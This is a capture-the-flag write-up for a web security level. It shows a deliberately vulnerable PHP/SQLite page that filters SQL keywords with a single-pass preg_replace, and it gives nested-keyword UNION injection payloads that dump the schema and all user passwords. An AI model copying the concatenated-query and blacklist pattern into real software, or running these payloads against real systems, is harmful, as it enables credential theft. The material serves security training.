# level02
## Source files  
source.php
```php
<?php
ini_set('display_errors', 'on');

class LevelTwo {
    public function doQuery($injection) {
        $pdo = new SQLite3('leveltwo.db', SQLITE3_OPEN_READONLY);

        $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
        $injection = preg_replace ('/' . $searchWords . '/i', '', $injection);

        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query ($query);
        $users = $getUsers->fetchArray (SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    $lt = new LevelTwo ();
    $userDetails = $lt->doQuery ($_POST['user_id']);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>#WebSec Level Two</title>
    <link rel="stylesheet" href="../static/bootstrap.min.css" />
</head>
    <body>
        <div id="main">
            <div class="container">
                    <div class="row">
                        <h1>LevelTwo <small>Select the user by ID you wish to view</small></h1>
                    </div>
                    <div class="row">
                        <p class="lead">
                            This application is the same as the <a href="../level01/index.php">previous one</a> (You can <a href="./source.php">check by yourself</a> if you don't trust us). However, the developers saw the logs and found that the application was being attacked so they filtered out some of the database keywords which made it possible.<br />
                        </p>
                        <p class="lead">
                            The following keywords were found to be filtered by the application using <a href="https://secure.php.net/preg_replace">preg_replace ()</a>: <mark>union</mark>, <mark>order</mark>, <mark>select</mark>, <mark>from</mark>, <mark>group</mark>, <mark>by</mark>.
                        </p>
                    </div>
                </div>
            </div>
            <div class="container">
                    <?php if (isset ($userDetails) && !empty ($userDetails)): ?>
                        <div class="row">
                            <p class="well"><strong>Username for given ID</strong>: <?php echo $userDetails['username']; ?> </p>
                            <p class="well"><strong>Other User Details</strong>: <br />
                                <?php 
                                $keys = array_keys($userDetails);
                                $i = 0;

                                foreach($userDetails as $user) { 
                                    echo $keys[$i++] . ' -> ' . $user . "<br />";
                                } 
                                ?> 
                            </p>
                        </div>
                    <?php endif; ?>

                    <div class="row">
                        <form name="username" method="post">
                            <div class="form-group col-md-2">
                                <input type="text" class="form-control" id="user_id" name="user_id" placeholder="1" required>
                            </div>
                            <div class="form-group col-md-2">
                                <input type="submit" class="form-control btn btn-default" name="submit">
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
        <script type="text/javascript" src="../static/bootstrap.min.js"></script>
    </body>
</html>
```
## Writeup  
`preg_replace()` function is added to delete `union`, `order`, `select`, `from`, `group`, `by` from input string. However... what happens if user input is `uunionnion`? `preg_replace()` function works and user input will be changed to `union`. In this way, `preg_replace()` function is not a problem for us :)

Then, the way to solve is same with level01.
1. enumerate table_schema (refered [cheatsheet](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet))  
`999 UbyNION SbyELECT 1,sql FbyROM sqlite_master WHERE type='table';--`
2. One of its users' passwords is the flag  
`999 UbyNION SbyELECT 1,GbyROUP_CONCAT(password) FbyROM users;--`  